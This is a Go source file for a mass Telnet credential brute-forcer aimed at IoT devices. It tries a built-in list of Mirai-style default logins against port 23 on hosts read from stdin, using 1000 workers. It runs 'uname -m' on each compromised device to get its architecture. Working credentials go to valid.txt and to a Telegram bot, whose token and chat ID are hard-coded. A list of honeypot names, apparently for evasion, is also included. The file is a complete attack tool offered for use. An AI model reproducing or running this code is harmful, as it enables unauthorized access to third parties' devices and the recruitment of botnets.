package main

import (
	"bufio"
	"bytes"
	"encoding/json"
	"fmt"
	"io"
	"net"
	"net/http"
	"os"
	"runtime"
	"strings"
	"sync"
	"sync/atomic"
	"time"
)

var CREDENTIALS = []struct {
	Username string
	Password string
}{
	{"root", "root"},
	{"root", ""},
	{"root", "icatch99"},
	{"admin", "admin"},
	{"user", "user"},
	{"admin", "VnT3ch@dm1n"},
	{"telnet", "telnet"},
	{"root", "86981198"},
	{"admin", "password"},
	{"admin", ""},
	{"guest", "guest"},
	{"admin", "1234"},
	{"root", "1234"},
	{"pi", "raspberry"},
	{"support", "support"},
	{"ubnt", "ubnt"},
	{"admin", "123456"},
	{"root", "toor"},
	{"admin", "admin123"},
	{"service", "service"},
	{"tech", "tech"},
	{"cisco", "cisco"},
	{"user", "password"},
	{"root", "password"},
	{"root", "admin"},
	{"admin", "admin1"},
	{"root", "123456"},
	{"root", "pass"},
	{"admin", "pass"},
	{"administrator", "password"},
	{"administrator", "admin"},
	{"root", "default"},
	{"admin", "default"},
	{"root", "vizxv"},
	{"admin", "vizxv"},
	{"root", "xc3511"},
	{"admin", "xc3511"},
	{"root", "admin1234"},
	{"admin", "admin1234"},
	{"root", "anko"},
	{"admin", "anko"},
	{"admin", "system"},
	{"root", "system"},
}

const (
	TELNET_TIMEOUT     = 5 * time.Second
	CONNECT_TIMEOUT    = 3 * time.Second
	MAX_WORKERS        = 1000
	MAX_QUEUE_SIZE     = 100000
	STATS_INTERVAL     = 1 * time.Second
	TELEGRAM_BOT_TOKEN = "8183155028:AAH2iJlMNydW3igennVQPma4bESnKd54oMk"
	TELEGRAM_CHAT_ID   = "-1003702606838"
)

var invalidOutputKeywords = []string{
	"command not found",
	"invalid input",
	"wrong parameter",
	"access denied",
	"not recognized",
	"% Invalid input",
	"% Wrong parameter",
	"unknown command",
	"syntax error",
	"bad command",
	"invalid command",
	"unrecognized",
	"not found",
	"connection refused",
	"network is unreachable",
	"ERROR::Command is not existed",
	"tfalse, Invalid argument",
	"Command not implemented yet",
	"^",
	"Incorrect command.",
}

var BANNERS_AFTER_LOGIN = []string{
	"[admin@localhost ~]$",
	"[admin@localhost ~]#",
	"[admin@localhost tmp]$",
	"[admin@localhost tmp]#",
	"[admin@localhost /]$",
	"[admin@localhost /]#",
	"[admin@LocalHost ~]$",
	"[admin@LocalHost ~]#",
	"[admin@LocalHost tmp]$",
	"[admin@LocalHost tmp]#",
	"[admin@LocalHost /]$",
	"[admin@LocalHost /]#",
	"[administrator@localhost ~]$",
	"[administrator@localhost ~]#",
	"[administrator@localhost tmp]$",
	"[administrator@localhost tmp]#",
	"[administrator@localhost /]$",
	"[administrator@localhost /]#",
	"[administrator@LocalHost ~]$",
	"[administrator@LocalHost ~]#",
	"[administrator@LocalHost tmp]$",
	"[administrator@LocalHost tmp]#",
	"[administrator@LocalHost /]$",
	"[administrator@LocalHost /]#",
	"[cisco@localhost ~]$",
	"[cisco@localhost ~]#",
	"[cisco@localhost tmp]$",
	"[cisco@localhost tmp]#",
	"[cisco@localhost /]$",
	"[cisco@localhost /]#",
	"[cisco@LocalHost ~]$",
	"[cisco@LocalHost ~]#",
	"[cisco@LocalHost tmp]$",
	"[cisco@LocalHost tmp]#",
	"[cisco@LocalHost /]$",
	"[cisco@LocalHost /]#",
	"[pi@raspberrypi ~]$",
	"[pi@raspberrypi ~]#",
	"[pi@raspberrypi tmp]$",
	"[pi@raspberrypi tmp]#",
	"[pi@raspberrypi /]$",
	"[pi@raspberrypi /]#",
	"[pi@localhost ~]$",
	"[pi@localhost ~]#",
	"[pi@localhost tmp]$",
	"[pi@localhost tmp]#",
	"[pi@localhost /]$",
	"[pi@localhost /]#",
	"[pi@LocalHost ~]$",
	"[pi@LocalHost ~]#",
	"[pi@LocalHost tmp]$",
	"[pi@LocalHost tmp]#",
	"[pi@LocalHost /]$",
	"[pi@LocalHost /]#",
	"[root@LocalHost ~]$",
	"[root@LocalHost ~]#",
	"[root@LocalHost tmp]$",
	"[root@LocalHost tmp]#",
	"[root@LocalHost /]$",
	"[root@LocalHost /]#",
	"[root@localhost ~]$",
	"[root@localhost ~]#",
	"[root@localhost tmp]$",
	"[root@localhost tmp]#",
	"[root@localhost /]$",
	"[root@localhost /]#",
	"[ubnt@localhost ~]$",
	"[ubnt@localhost ~]#",
	"[ubnt@localhost tmp]$",
	"[ubnt@localhost tmp]#",
	"[ubnt@localhost /]$",
	"[ubnt@localhost /]#",
	"[ubnt@LocalHost ~]$",
	"[ubnt@LocalHost ~]#",
	"[ubnt@LocalHost tmp]$",
	"[ubnt@LocalHost tmp]#",
	"[ubnt@LocalHost /]$",
	"[ubnt@LocalHost /]#",
	"[user@localhost ~]$",
	"[user@localhost ~]#",
	"[user@localhost tmp]$",
	"[user@localhost tmp]#",
	"[user@localhost /]$",
	"[user@localhost /]#",
	"[user@LocalHost ~]$",
	"[user@LocalHost ~]#",
	"[user@LocalHost tmp]$",
	"[user@LocalHost tmp]#",
	"[user@LocalHost /]$",
	"[user@LocalHost /]#",
	"[guest@localhost ~]$",
	"[guest@localhost ~]#",
	"[guest@localhost tmp]$",
	"[guest@localhost tmp]#",
	"[guest@localhost /]$",
	"[guest@localhost /]#",
	"[guest@LocalHost ~]$",
	"[guest@LocalHost ~]#",
	"[guest@LocalHost tmp]$",
	"[guest@LocalHost tmp]#",
	"[guest@LocalHost /]$",
	"[guest@LocalHost /]#",
	"[support@localhost ~]$",
	"[support@localhost ~]#",
	"[support@localhost tmp]$",
	"[support@localhost tmp]#",
	"[support@localhost /]$",
	"[support@localhost /]#",
	"[support@LocalHost ~]$",
	"[support@LocalHost ~]#",
	"[support@LocalHost tmp]$",
	"[support@LocalHost tmp]#",
	"[support@LocalHost /]$",
	"[support@LocalHost /]#",
	"[service@localhost ~]$",
	"[service@localhost ~]#",
	"[service@localhost tmp]$",
	"[service@localhost tmp]#",
	"[service@localhost /]$",
	"[service@localhost /]#",
	"[service@LocalHost ~]$",
	"[service@LocalHost ~]#",
	"[service@LocalHost tmp]$",
	"[service@LocalHost tmp]#",
	"[service@LocalHost /]$",
	"[service@LocalHost /]#",
	"[tech@localhost ~]$",
	"[tech@localhost ~]#",
	"[tech@localhost tmp]$",
	"[tech@localhost tmp]#",
	"[tech@localhost /]$",
	"[tech@localhost /]#",
	"[tech@LocalHost ~]$",
	"[tech@LocalHost ~]#",
	"[tech@LocalHost tmp]$",
	"[tech@LocalHost tmp]#",
	"[tech@LocalHost /]$",
	"[tech@LocalHost /]#",
	"[telnet@localhost ~]$",
	"[telnet@localhost ~]#",
	"[telnet@localhost tmp]$",
	"[telnet@localhost tmp]#",
	"[telnet@localhost /]$",
	"[telnet@localhost /]#",
	"[telnet@LocalHost ~]$",
	"[telnet@LocalHost ~]#",
	"[telnet@LocalHost tmp]$",
	"[telnet@LocalHost tmp]#",
	"[telnet@LocalHost /]$",
	"[telnet@LocalHost /]#",
}

var BANNERS_BEFORE_LOGIN = []string{
	"honeypot",
	"honeypots",
	"cowrie",
	"kippo",
	"dionaea",
	"glastopf",
	"conpot",
	"heralding",
	"snare",
	"tanner",
	"wordpot",
	"shockpot",
	"honeyd",
	"honeytrap",
	"nepenthes",
	"amun",
	"beeswarm",
	"mwcollect",
	"opencanary",
	"canary",
	"thinkst",
	"splunk",
	"splunkd",
}

var (
	totalAttempted uint64
	totalSuccess   uint64
	muFile         sync.Mutex
	muTelegram     sync.Mutex
	lastTelegram   time.Time
	httpClient     = &http.Client{Timeout: 10 * time.Second}
)

type TelnetScanner struct {
	hostQueue chan string
	done      chan bool
	wg        sync.WaitGroup
	queueSize int64
}

func NewTelnetScanner() *TelnetScanner {
	runtime.GOMAXPROCS(runtime.NumCPU())
	return &TelnetScanner{
		hostQueue: make(chan string, MAX_QUEUE_SIZE),
		done:      make(chan bool),
	}
}

func sendTelegramMessage(message string) error {
	url := fmt.Sprintf("https://api.telegram.org/bot%s/sendMessage", TELEGRAM_BOT_TOKEN)
	payload := map[string]interface{}{
		"chat_id":    TELEGRAM_CHAT_ID,
		"text":       message,
		"parse_mode": "",
	}
	jsonData, err := json.Marshal(payload)
	if err != nil {
		return err
	}
	resp, err := httpClient.Post(url, "application/json", bytes.NewBuffer(jsonData))
	if err != nil {
		return err
	}
	defer resp.Body.Close()
	io.Copy(io.Discard, resp.Body)
	return nil
}

func sendValidTelegram(text string) {
	muTelegram.Lock()
	defer muTelegram.Unlock()
	if time.Since(lastTelegram) < 500*time.Millisecond {
		time.Sleep(500*time.Millisecond - time.Since(lastTelegram))
	}
	lastTelegram = time.Now()
	sendTelegramMessage(text)
}

func readUntil(conn net.Conn, timeout time.Duration, keywords []string) (string, error) {
	conn.SetReadDeadline(time.Now().Add(timeout))
	var buf bytes.Buffer
	tmp := make([]byte, 8192)
	for {
		n, err := conn.Read(tmp)
		if err != nil {
			if err == io.EOF {
				break
			}
			return buf.String(), err
		}
		buf.Write(tmp[:n])
		s := buf.String()
		for _, kw := range keywords {
			if strings.Contains(s, kw) {
				return s, nil
			}
		}
		if buf.Len() > 65536 {
			break
		}
	}
	return buf.String(), nil
}

func sendCommand(conn net.Conn, cmd string, timeout time.Duration, promptKeywords []string) (string, error) {
	conn.SetWriteDeadline(time.Now().Add(2 * time.Second))
	_, err := conn.Write([]byte(cmd + "\n"))
	if err != nil {
		return "", err
	}
	return readUntil(conn, timeout, promptKeywords)
}

func (s *TelnetScanner) tryLogin(host, username, password string) (bool, string) {
	addr := host + ":23"
	dialer := &net.Dialer{Timeout: CONNECT_TIMEOUT}
	conn, err := dialer.Dial("tcp", addr)
	if err != nil {
		return false, ""
	}
	defer conn.Close()

	_, err = readUntil(conn, TELNET_TIMEOUT, []string{"login:", "Login:", "username:", "Username:"})
	if err != nil {
		return false, ""
	}

	_, err = sendCommand(conn, username, TELNET_TIMEOUT, []string{"password:", "Password:"})
	if err != nil {
		return false, ""
	}

	resp, err := sendCommand(conn, password, TELNET_TIMEOUT, []string{"#", "$", ">"})
	if err != nil {
		return false, ""
	}
	if !strings.Contains(resp, "#") && !strings.Contains(resp, "$") && !strings.Contains(resp, ">") {
		return false, ""
	}

	unameOut, err := sendCommand(conn, "uname -m", TELNET_TIMEOUT, []string{"#", "$", ">"})
	if err != nil {
		return true, "unknown"
	}
	arch := strings.TrimSpace(unameOut)
	if arch == "" {
		return true, "unknown"
	}
	return true, arch
}

func (s *TelnetScanner) processTarget(host string) {
	for _, cred := range CREDENTIALS {
		ok, arch := s.tryLogin(host, cred.Username, cred.Password)
		if ok {
			atomic.AddUint64(&totalSuccess, 1)
			line := fmt.Sprintf("%s:23 %s:%s %s", host, cred.Username, cred.Password, arch)
			fmt.Printf("[SUCCESS] %s\n", line)
			muFile.Lock()
			f, _ := os.OpenFile("valid.txt", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
			fmt.Fprintf(f, "%s\n", line)
			f.Close()
			muFile.Unlock()
			sendValidTelegram(line)
			return
		}
	}
}

func (s *TelnetScanner) worker() {
	defer s.wg.Done()
	for host := range s.hostQueue {
		atomic.AddInt64(&s.queueSize, -1)
		s.processTarget(host)
		atomic.AddUint64(&totalAttempted, 1)
	}
}

func (s *TelnetScanner) statsThread() {
	ticker := time.NewTicker(STATS_INTERVAL)
	defer ticker.Stop()
	for {
		select {
		case <-s.done:
			return
		case <-ticker.C:
			fmt.Printf("\rtotal: %d | success: %d | queue: %d | routines: %d",
				atomic.LoadUint64(&totalAttempted),
				atomic.LoadUint64(&totalSuccess),
				atomic.LoadInt64(&s.queueSize),
				runtime.NumGoroutine())
		}
	}
}

func (s *TelnetScanner) Run() {
	fmt.Printf("Initializing Telnet scanner (%d / %d)...\n", MAX_WORKERS, MAX_QUEUE_SIZE)
	go s.statsThread()
	stdinDone := make(chan bool)
	go func() {
		reader := bufio.NewReader(os.Stdin)
		for {
			line, err := reader.ReadString('\n')
			if err != nil {
				break
			}
			host := strings.TrimSpace(line)
			if host != "" {
				atomic.AddInt64(&s.queueSize, 1)
				s.hostQueue <- host
			}
		}
		stdinDone <- true
	}()
	for i := 0; i < MAX_WORKERS; i++ {
		s.wg.Add(1)
		go s.worker()
	}
	<-stdinDone
	close(s.hostQueue)
	s.wg.Wait()
	s.done <- true
}

func main() {
	fmt.Println("\n🤖 Telnet Scanner")
	scanner := NewTelnetScanner()
	scanner.Run()
}
